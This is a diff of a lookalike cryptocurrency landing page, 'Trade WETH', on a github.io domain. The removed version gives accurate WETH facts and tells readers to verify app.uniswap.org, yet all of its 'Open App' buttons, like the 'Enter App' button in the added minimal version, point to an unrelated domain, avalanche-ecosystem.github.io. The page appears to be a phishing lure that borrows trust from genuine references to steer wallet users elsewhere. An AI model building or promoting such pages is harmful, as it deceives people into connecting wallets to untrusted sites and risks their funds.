@@ -1,47 +1,120 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Trade WETH - Open App</title><meta name="description" content="trade weth through Uniswap with the verified Wrapped Ether contract, wallet quote review, and a direct app route to confirm onchain.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://trade-weth.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Trade WETH - Open App"><meta property="og:description" content="trade weth through Uniswap with the verified Wrapped Ether contract, wallet quote review, and a direct app route to confirm onchain.">
-<meta property="og:url" content="https://trade-weth.github.io/"><meta property="og:image" content="https://trade-weth.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Trade WETH - Open App"><meta name="twitter:description" content="trade weth through Uniswap with the verified Wrapped Ether contract, wallet quote review, and a direct app route to confirm onchain."><meta name="twitter:image" content="https://trade-weth.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://trade-weth.github.io/#website", "url": "https://trade-weth.github.io/", "name": "WETH"}, {"@type": "WebPage", "@id": "https://trade-weth.github.io/#webpage", "url": "https://trade-weth.github.io/", "name": "Trade WETH - Open App", "description": "trade weth through Uniswap with the verified Wrapped Ether contract, wallet quote review, and a direct app route to confirm onchain.", "inLanguage": "en", "isPartOf": {"@id": "https://trade-weth.github.io/#website"}}, {"@type": "Organization", "@id": "https://trade-weth.github.io/#org", "name": "WETH", "url": "https://trade-weth.github.io/", "logo": "https://trade-weth.github.io/og-cover.png", "sameAs": ["https://weth.io/", "https://github.com/ethereum", "https://x.com/ethereum", "https://www.coingecko.com/en/coins/weth"]}, {"@type": "WebApplication", "@id": "https://trade-weth.github.io/#app", "name": "Trade WETH", "url": "https://trade-weth.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "trade weth through Uniswap with the verified Wrapped Ether contract, wallet quote review, and a direct app route to confirm onchain.", "featureList": ["ERC-20 wrapped ETH", "Ethereum mainnet", "WETH9 0xC02a...56Cc2"], "isPartOf": {"@id": "https://trade-weth.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://trade-weth.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "Is WETH always worth the same as ETH?", "acceptedAnswer": {"@type": "Answer", "text": "WETH is redeemable for ETH at a one-to-one rate through the wrapper contract, so the protocol-level relationship is 1 WETH for 1 ETH. Market screens may show tiny differences because prices are aggregated across venues, tokens, and chains. For most users, the relevant cost is not the WETH-ETH spread but the gas fee to wrap or unwrap and the slippage if WETH is traded into a different asset."}}, {"@type": "Question", "name": "Can I trade WETH without unwrapping it first?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. In DeFi, WETH is often easier to trade than native ETH because it follows the ERC-20 standard. DEX pools, token approvals, lending markets, and NFT bidding systems can transfer WETH in the same way they transfer other tokens. You only need to unwrap when you specifically need native ETH for gas, direct ETH transfers, staking, or a withdrawal destination that does not support WETH."}}, {"@type": "Question", "name": "Why do DEXs use WETH instead of ETH?", "acceptedAnswer": {"@type": "Answer", "text": "DEX contracts generally handle ERC-20 tokens through a shared interface for balances, approvals, and transfers. ETH was created before ERC-20 became the standard, so WETH acts as the compatibility layer that lets ETH behave like other tokens in automated market makers and routing contracts. Many interfaces hide this complexity by wrapping or unwrapping inside the transaction path."}}, {"@type": "Question", "name": "What is the safest way to verify WETH before swapping?", "acceptedAnswer": {"@type": "Answer", "text": "Check the contract address on the relevant chain, not only the token symbol. On Ethereum mainnet, canonical WETH is 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2. For Arbitrum, Base, Optimism, Polygon, or another network, use that network's official explorer or a trusted token registry. Avoid tokens promoted only through social posts, direct messages, or newly created pools with thin liquidity."}}, {"@type": "Question", "name": "Do I need ETH to trade WETH?", "acceptedAnswer": {"@type": "Answer", "text": "You need the chain's native gas token to submit the transaction. On Ethereum, that means ETH; on many Ethereum Layer 2 networks, gas is also paid in ETH. WETH itself cannot pay gas on Ethereum. Keep a small native ETH balance on the same network so approvals, swaps, wrapping, and unwrapping do not fail after you have already moved funds."}}, {"@type": "Question", "name": "Is WETH on Base or Arbitrum the same token as Ethereum WETH?", "acceptedAnswer": {"@type": "Answer", "text": "It represents wrapped ETH on that specific network, but it is not the same contract as Ethereum mainnet WETH. Each chain has its own token address, bridge design, and liquidity. When moving between networks, use a reputable bridge or exchange withdrawal path and verify both the source and destination assets. Sending tokens to the wrong chain or unsupported address can make recovery difficult or impossible."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="WETH"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">WETH</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Trade WETH</title>
+  <meta name="description" content="Trade WETH lets you exchange Wrapped Ether for other cryptocurrencies in a few quick steps.">
+  <link rel="canonical" href="https://trade-weth.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F4EF">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Trade WETH">
+  <meta property="og:description" content="Trade WETH lets you exchange Wrapped Ether for other cryptocurrencies in a few quick steps.">
+  <meta property="og:url" content="https://trade-weth.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Trade WETH">
+  <meta name="twitter:description" content="Trade WETH lets you exchange Wrapped Ether for other cryptocurrencies in a few quick steps.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://trade-weth.github.io/#website",
+        "url": "https://trade-weth.github.io/",
+        "name": "Trade WETH",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://trade-weth.github.io/#app",
+        "name": "Trade WETH",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://trade-weth.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://trade-weth.github.io/#organization",
+        "name": "Trade WETH",
+        "url": "https://trade-weth.github.io/",
+        "logo": "https://trade-weth.github.io/favicon.png"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Trade WETH home">
+      <img src="simpleswap.png" width="30" height="30" alt="">
+      <span>Trade WETH</span>
+    </a>
+
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://bitcoin.org/en/" target="_blank" rel="nofollow noopener noreferrer">Bitcoin</a>
+      <a href="https://ethereum.org/" target="_blank" rel="nofollow noopener noreferrer">Ethereum</a>
+      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
+    </nav>
+
+    <span class="spacer" aria-hidden="true"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Trade WETH">
       <h1>Trade WETH</h1>
-      <div class="bridge-widget" role="group" aria-label="WETH preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/weth.png" alt="WETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>WETH</b> · Ethereum</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open WETH ↗</a></div>
-      <p class="hero-note">Live preview — open the official WETH app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">ERC-20 wrapped ETH</span><span class="trust-chip">Ethereum mainnet</span><span class="trust-chip">WETH9 0xC02a...56Cc2</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Trade WETH?</h2><div class="capsule"><strong>WETH</strong> is <a class="inline-link" href="https://ethereum.org/wrapped-eth/" rel="noopener noreferrer">Wrapped Ether</a>, the <a class="inline-link" href="https://www.coingecko.com/learn/weth-vs-eth-what-s-the-distinction" rel="noopener noreferrer">ERC-20 representation of ETH</a> used across Ethereum DeFi; <a href='https://ethereum.org/wrapped-eth/'>ethereum.org</a> explains why wrapping makes ETH work with ERC-20 contracts.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Trade WETH at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Wrapped ETH / ERC-20 trading asset</b></div><div class="f"><small>Network</small><b>Ethereum and major EVM networks</b></div><div class="f"><small>Token</small><b>WETH</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://coinmarketcap.com/academy/article/what-is-wrapped-ethereum-weth" rel="noopener noreferrer">Smart-contract wrapped ETH</a></b></div><div class="f"><small>Peg</small><b>1 WETH = 1 ETH at the wrapper contract level</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Trade WETH on Ethereum and Layer 2 networks</h2><div class="intent-a">WETH is the ERC-20 version of ETH used by decentralized exchanges, NFT marketplaces, lending protocols, and liquidity pools. To trade WETH, users typically swap ETH into WETH through a DEX, wallet swap, or the WETH contract, then trade WETH against tokens such as USDC, USDT, WBTC, or governance tokens. The important detail is network-specific liquidity: Ethereum mainnet usually has the deepest pools, while <a class="inline-link" href="https://l2beat.com/scaling/summary" rel="noopener noreferrer">Arbitrum, Base, Optimism, and Polygon</a> can reduce transaction cost. Always verify the token contract for the exact chain before trading; the <a class="inline-link" href="https://etherscan.io/token/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2" rel="noopener noreferrer">canonical Ethereum WETH contract</a> is visible on <a href="https://etherscan.io/token/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2">Etherscan's WETH token page</a>.</div></div></section><section class="section"><div class="container"><h2>Best WETH pairs for liquidity and <a class="inline-link" href="https://www.investopedia.com/terms/s/slippage.asp" rel="noopener noreferrer">slippage</a></h2><div class="intent-a">The most searched WETH trading pairs are <a class="inline-link" href="https://www.coingecko.com/en/coins/weth" rel="noopener noreferrer">WETH/USDC</a>, WETH/USDT, WETH/WBTC, and WETH against major DeFi tokens. WETH/USDC often provides clear USD pricing and deep liquidity, while WETH/WBTC is common for ETH-BTC rotation. Slippage depends on pool depth, route design, volatility, and trade size, so there is no fixed fee that applies to every WETH trade. A practical workflow is to compare the route, price impact, DEX fee tier, gas estimate, and minimum received before signing. On Layer 2 networks, smaller trades can become more economical because gas is usually lower than Ethereum mainnet.</div></div></section><section class="section section-alt"><div class="container"><h2>WETH contract address and fake token checks</h2><div class="intent-a">The canonical WETH token on Ethereum is <a class="inline-link" href="https://etherscan.io/address/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2" rel="noopener noreferrer">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</a>, but each network uses its own WETH address. A common mistake is copying a mainnet address into an L2 wallet or trusting a token with the same symbol but a different contract. Before trading, confirm the address in at least one authoritative source such as the block explorer, CoinGecko, or the app's official token list. Fake WETH tokens often copy the name, icon, and symbol; the contract address, holders, verification status, and pool liquidity are the useful signals.</div></div></section>
-  <section class="section"><div class="container"><h2>How to trade Trade WETH</h2><ol class="steps"><li><b>Open the app</b><span>Use the official Uniswap web app route and confirm the domain is app.uniswap.org before connecting.</span></li><li><b>Connect wallet</b><span>Choose an <a class="inline-link" href="https://ethereum.org/en/wallets/find-wallet/" rel="noopener noreferrer">Ethereum wallet</a> and keep ETH available for network gas.</span></li><li><b>Verify WETH</b><span>Check the Ethereum WETH contract address: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2.</span></li><li><b>Review and confirm</b><span>Compare the quote, route, price impact, and approval details before signing onchain.</span></li></ol><div class="cta-band"><div><p>Ready to trade?</p><p class="sub">Open the official WETH app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open WETH ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>WETH vs native ETH for trading</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>WETH</th><th>Native ETH</th></tr></thead><tbody><tr><td>Token standard</td><td><a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">ERC-20 token</a> used in DeFi contracts</td><td>Native Ethereum asset</td></tr><tr><td>DEX trading</td><td>Works directly in ERC-20 pools and approvals</td><td>Often wrapped automatically before routing</td></tr><tr><td>Gas payments</td><td>Cannot pay Ethereum gas</td><td>Pays network transaction fees</td></tr><tr><td>Best use</td><td>Swaps, <a class="inline-link" href="https://docs.uniswap.org/concepts/protocol/liquidity-provision" rel="noopener noreferrer">LP positions</a>, lending, NFT bids</td><td>Gas, transfers, staking, exchange withdrawals</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Trade WETH FAQ</h2><div class="faq-list"><details open><summary><h3>Is WETH always worth the same as ETH?</h3></summary><div>WETH is redeemable for ETH at a <a class="inline-link" href="https://coinmarketcap.com/academy/article/what-is-wrapped-ethereum-weth" rel="noopener noreferrer">one-to-one rate</a> through the wrapper contract, so the protocol-level relationship is 1 WETH for 1 ETH. Market screens may show tiny differences because prices are aggregated across venues, tokens, and chains. For most users, the relevant cost is not the WETH-ETH spread but the gas fee to wrap or unwrap and the slippage if WETH is traded into a different asset.</div></details><details><summary><h3>Can I trade WETH without unwrapping it first?</h3></summary><div>Yes. In DeFi, WETH is often easier to trade than native ETH because it follows the ERC-20 standard. DEX pools, token approvals, lending markets, and NFT bidding systems can transfer WETH in the same way they transfer other tokens. You only need to unwrap when you specifically need native ETH for gas, direct ETH transfers, staking, or a withdrawal destination that does not support WETH.</div></details><details><summary><h3>Why do DEXs use WETH instead of ETH?</h3></summary><div>DEX contracts generally handle ERC-20 tokens through a shared interface for balances, approvals, and transfers. ETH was created before ERC-20 became the standard, so WETH acts as the compatibility layer that lets ETH behave like other tokens in automated market makers and routing contracts. Many interfaces hide this complexity by wrapping or unwrapping inside the transaction path.</div></details><details><summary><h3>What is the safest way to verify WETH before swapping?</h3></summary><div>Check the contract address on the relevant chain, not only the token symbol. On Ethereum mainnet, canonical WETH is 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2. For Arbitrum, Base, Optimism, Polygon, or another network, use that network's official explorer or a trusted token registry. Avoid tokens promoted only through social posts, direct messages, or newly created pools with thin liquidity.</div></details><details><summary><h3>Do I need ETH to trade WETH?</h3></summary><div>You need the chain's native gas token to submit the transaction. On Ethereum, that means ETH; on many Ethereum Layer 2 networks, gas is also paid in ETH. WETH itself cannot pay gas on Ethereum. Keep a small native ETH balance on the same network so approvals, swaps, wrapping, and unwrapping do not fail after you have already moved funds.</div></details><details><summary><h3>Is WETH on Base or Arbitrum the same token as Ethereum WETH?</h3></summary><div>It represents wrapped ETH on that specific network, but it is not the same contract as Ethereum mainnet WETH. Each chain has its own token address, bridge design, and liquidity. When moving between networks, use a reputable bridge or exchange withdrawal path and verify both the source and destination assets. Sending tokens to the wrong chain or unsupported address can make recovery difficult or impossible.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official app; verify app.uniswap.org before connecting. Educational information only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+      <p class="value"><strong>Trade WETH</strong> lets you exchange Wrapped Ether for other cryptocurrencies in a few quick steps.</p>
+    </section>
+
+    <section class="app-card" aria-label="Exchange route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+
+        <button class="switch" type="button" data-switch aria-label="Switch exchange direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="WETH">
+            <span>WETH</span>
+          </span>
+        </div>
+      </div>
+
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+    </section>
+  </main>
+
+  <footer class="footer">Trade WETH &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
+</body>
+</html>
